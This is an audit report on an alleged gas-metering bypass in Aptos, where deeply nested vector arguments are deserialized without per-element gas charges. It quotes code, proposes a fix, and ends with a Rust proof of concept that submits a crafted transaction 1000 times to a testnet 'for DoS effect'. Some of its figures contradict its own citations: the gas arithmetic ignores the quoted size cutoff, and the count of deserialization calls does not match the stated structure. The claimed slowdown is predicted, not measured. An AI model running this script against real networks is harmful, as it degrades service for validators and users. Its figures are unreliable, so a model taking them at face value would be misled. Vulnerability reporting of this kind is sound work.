# Audit Report

## Title
Gas Metering Bypass via Deeply Nested Vector Arguments in Entry Function Deserialization

## Summary
Transaction argument deserialization does not charge gas proportional to computational work performed when processing deeply nested vector structures. The intrinsic gas is charged based on serialized transaction size only, allowing attackers to cause disproportionate CPU consumption on validator nodes by crafting deeply nested vector arguments (e.g., `vec<vec<vec<vec<u8>>>>`), leading to validator slowdowns.

## Finding Description

The vulnerability exists in the transaction argument construction and deserialization flow. When an entry function is invoked with vector arguments, the deserialization process occurs in two phases:

**Phase 1: Argument Construction** (before Move VM execution)
The `construct_args` function in `aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs` processes serialized arguments and contains an explicit acknowledgment of missing gas metering: [1](#0-0) 

For vector arguments, the `recursively_construct_arg` function iterates through vector elements without charging gas per iteration: [2](#0-1) 

The gas_meter parameter is passed through but never invoked to charge for the loop iterations themselves. Only struct constructor invocations charge gas.

**Phase 2: Intrinsic Gas Charging**
Before argument construction, intrinsic gas is charged based solely on the serialized transaction size: [3](#0-2) 

The implementation charges a flat rate per byte: [4](#0-3) 

With gas parameters: [5](#0-4) 

**The Attack Vector:**

An attacker can craft entry function arguments with deeply nested vectors that have:
- **Small serialized size**: The nested structure is represented compactly in BCS encoding
- **High deserialization cost**: Each nesting level adds function call overhead, vector allocation, and loop management

Example attack payload:
- Transaction with `vec<vec<vec<vec<u8>>>>` argument
- Structure: 5 × 5 × 5 × 50 = 6,250 u8 elements across 4 nesting levels
- Serialized size: ~6.3 KB
- Deserialization operations: 5 + 25 + 125 + 625 + 6,250 = 7,030 function calls

The intrinsic gas charged (`1,158 × 6,300 = ~7.3M gas`) is calibrated for flat structures, not the compounded overhead of 4 nesting levels with vector allocations and recursive function calls at each level.

**Invariant Violations:**

This breaks Critical Invariant #9: "Resource Limits: All operations must respect gas, storage, and computational limits." The deserialization consumes significantly more CPU than the gas charged accounts for.

## Impact Explanation

**High Severity - Validator Node Slowdowns**

This vulnerability qualifies as High Severity under the Aptos bug bounty program criteria for "Validator node slowdowns."

Concrete impact:
1. **Validator Performance Degradation**: Repeated transactions with deeply nested arguments force validators to perform expensive deserialization without proportional gas charges
2. **Block Processing Delays**: Validators spend disproportionate time on argument deserialization, slowing block finalization
3. **DoS Vector**: Sustained attack can degrade network performance, affecting all users
4. **Gas Metering Evasion**: Attackers pay less than the true computational cost, subsidized by honest validators

The attack requires no special privileges - any user can submit such transactions. The maximum transaction size of 64 KB allows sufficient space for deeply nested structures to achieve significant amplification.

## Likelihood Explanation

**Likelihood: High**

This vulnerability is highly likely to be exploited because:

1. **Low Barrier to Entry**: Any user can submit transactions with crafted arguments
2. **No Special Access Required**: Does not require validator access or stake
3. **Easy to Execute**: Standard transaction submission process
4. **Difficult to Detect**: Appears as legitimate entry function calls
5. **Economic Incentive**: Attacker pays less gas than actual resource consumption

The developers have acknowledged this issue with the TODO comment indicating awareness but no implemented solution. The special handling for UTF-8 constructors with the "HACK mitigation of performance attack" comment shows they recognize performance attacks in argument construction: [6](#0-5) 

## Recommendation

Implement proper gas metering during argument construction by charging gas proportional to deserialization work:

1. **Charge per vector iteration**: In `recursively_construct_arg`, charge gas for each loop iteration when processing vectors
2. **Add depth-based multiplier**: Apply increasing gas costs for nested structures to account for compounded overhead
3. **Set depth limits**: Impose maximum nesting depth for vector arguments (e.g., 8 levels)
4. **Metered recursion**: Track recursion depth and charge accordingly

Suggested fix in `recursively_construct_arg`:

```rust
Vector(inner) => {
    let mut len = get_len(cursor)?;
    // CHARGE GAS FOR VECTOR DESERIALIZATION
    gas_meter.charge_vec_unpack(len)?;
    serialize_uleb128(len, arg);
    while len > 0 {
        recursively_construct_arg(
            session,
            loader,
            gas_meter,  // Now actually used
            traversal_context,
            inner,
            allowed_structs,
            cursor,
            initial_cursor_len,
            max_invocations,
            arg,
        )?;
        len -= 1;
    }
},
```

Additionally, set a maximum nesting depth similar to `max_invocations` for struct constructors.

## Proof of Concept

**Move Module (deploy to testnet):**

```move
module attacker::gas_exploit {
    entry fun nested_vector_sink(
        _account: &signer,
        _nested: vector<vector<vector<vector<u8>>>>
    ) {
        // Minimal work - just accept the argument
        // Deserialization cost already incurred before this runs
    }
}
```

**Rust Exploitation Code:**

```rust
use aptos_sdk::{
    types::transaction::{EntryFunction, TransactionPayload},
    rest_client::Client,
};
use bcs;

async fn exploit() -> Result<()> {
    let client = Client::new(url::Url::parse("https://fullnode.testnet.aptoslabs.com")?);
    
    // Create deeply nested vector: vec<vec<vec<vec<u8>>>>
    // 5 x 5 x 5 x 50 = 6,250 total u8 elements
    let mut level_4 = Vec::new();
    for _ in 0..5 {
        let mut level_3 = Vec::new();
        for _ in 0..5 {
            let mut level_2 = Vec::new();
            for _ in 0..5 {
                let level_1: Vec<u8> = vec![1u8; 50];
                level_2.push(level_1);
            }
            level_3.push(level_2);
        }
        level_4.push(level_3);
    }
    
    let serialized_args = vec![bcs::to_bytes(&level_4)?];
    
    let payload = TransactionPayload::EntryFunction(EntryFunction::new(
        ModuleId::new(attacker_address, "gas_exploit".parse()?),
        "nested_vector_sink".parse()?,
        vec![],
        serialized_args,
    ));
    
    // Submit transaction - deserialization cost much higher than gas charged
    // Repeat many times for DoS effect
    for _ in 0..1000 {
        client.submit_transaction(&account, payload.clone()).await?;
    }
    
    Ok(())
}
```

**Validation:**
Compare CPU time spent on deserialization vs gas charged. Measure with profiling tools on a validator node processing blocks containing these transactions. Expected result: CPU time 2-5x higher than comparable flat vector of same serialized size.

### Citations

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L242-242)
```rust
    // Perhaps in a future we should do proper gas metering here
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L345-363)
```rust
        Vector(inner) => {
            // get the vector length and iterate over each element
            let mut len = get_len(cursor)?;
            serialize_uleb128(len, arg);
            while len > 0 {
                recursively_construct_arg(
                    session,
                    loader,
                    gas_meter,
                    traversal_context,
                    inner,
                    allowed_structs,
                    cursor,
                    initial_cursor_len,
                    max_invocations,
                    arg,
                )?;
                len -= 1;
            }
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L429-432)
```rust
    // HACK mitigation of performance attack
    // To maintain compatibility with vector<string> or so on, we need to allow unlimited strings.
    // So we do not count the string constructor against the max_invocations, instead we
    // shortcut the string case to avoid the performance attack.
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L1040-1040)
```rust
        gas_meter.charge_intrinsic_gas_for_transaction(txn_data.transaction_size())?;
```

**File:** aptos-move/aptos-gas-meter/src/meter.rs (L607-615)
```rust
    fn charge_intrinsic_gas_for_transaction(&mut self, txn_size: NumBytes) -> VMResult<()> {
        let excess = txn_size
            .checked_sub(self.vm_gas_params().txn.large_transaction_cutoff)
            .unwrap_or_else(|| 0.into());

        self.algebra
            .charge_execution(MIN_TRANSACTION_GAS_UNITS + INTRINSIC_GAS_PER_BYTE * excess)
            .map_err(|e| e.finish(Location::Undefined))
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L33-48)
```rust
            min_transaction_gas_units: InternalGas,
            "min_transaction_gas_units",
            2_760_000
        ],
        // Any transaction over this size will be charged an additional amount per byte.
        [
            large_transaction_cutoff: NumBytes,
            "large_transaction_cutoff",
            600
        ],
        // The units of gas that to be charged per byte over the `large_transaction_cutoff` in addition to
        // `min_transaction_gas_units` for transactions whose size exceeds `large_transaction_cutoff`.
        [
            intrinsic_gas_per_byte: InternalGasPerByte,
            "intrinsic_gas_per_byte",
            1_158
```
